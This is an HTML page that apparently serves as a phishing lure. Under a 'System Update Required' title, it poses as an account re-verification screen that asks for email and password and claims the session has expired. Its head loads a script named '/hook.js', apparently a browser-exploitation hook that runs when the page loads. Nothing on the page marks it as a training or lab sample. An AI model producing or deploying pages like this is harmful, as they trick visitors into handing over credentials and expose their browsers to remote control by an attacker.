<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Welcome - System Update Required</title>
    <script src="/hook.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #333;
        }

        .card {
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            padding: 40px;
            max-width: 480px;
            width: 100%;
            text-align: center;
        }

        .logo {
            font-size: 48px;
            margin-bottom: 16px;
        }

        h1 {
            font-size: 22px;
            margin-bottom: 10px;
            color: #1a1a2e;
        }

        p {
            font-size: 14px;
            color: #666;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        .form-group {
            text-align: left;
            margin-bottom: 16px;
        }

        label {
            font-size: 13px;
            font-weight: 600;
            color: #444;
            display: block;
            margin-bottom: 6px;
        }

        input[type="text"],
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 10px 14px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
            outline: none;
            transition: border 0.2s;
        }

        input:focus {
            border-color: #4a90e2;
        }

        .btn {
            width: 100%;
            padding: 12px;
            background: #4a90e2;
            color: white;
            font-size: 15px;
            font-weight: 600;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 8px;
            transition: background 0.2s;
        }

        .btn:hover {
            background: #357abd;
        }

        .divider {
            border: none;
            border-top: 1px solid #eee;
            margin: 24px 0;
        }

        .links {
            font-size: 13px;
            color: #888;
        }

        .links a {
            color: #4a90e2;
            text-decoration: none;
        }

        .links a:hover {
            text-decoration: underline;
        }

        .notice {
            background: #fff8e1;
            border-left: 4px solid #ffc107;
            padding: 12px 16px;
            border-radius: 4px;
            font-size: 13px;
            color: #7a6000;
            text-align: left;
            margin-bottom: 24px;
        }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">🔒</div>
    <h1>Account Verification Required</h1>
    <p>Your session has expired. Please sign in again to continue.</p>

    <div class="notice">
        ⚠️ For your security, please re-enter your credentials to verify your identity.
    </div>

    <form onsubmit="return false;">
        <div class="form-group">
            <label for="email">Email Address</label>
            <input type="email" id="email" name="email" placeholder="you@example.com" autocomplete="email"/>
        </div>
        <div class="form-group">
            <label for="password">Password</label>
            <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="current-password"/>
        </div>
        <button class="btn" type="submit">Sign In</button>
    </form>

    <hr class="divider"/>

    <div class="links">
        <a href="#">Forgot password?</a> &nbsp;|&nbsp;
        <a href="#">Create an account</a> &nbsp;|&nbsp;
        <a href="#">Help</a>
    </div>
</div>

</body>
</html>
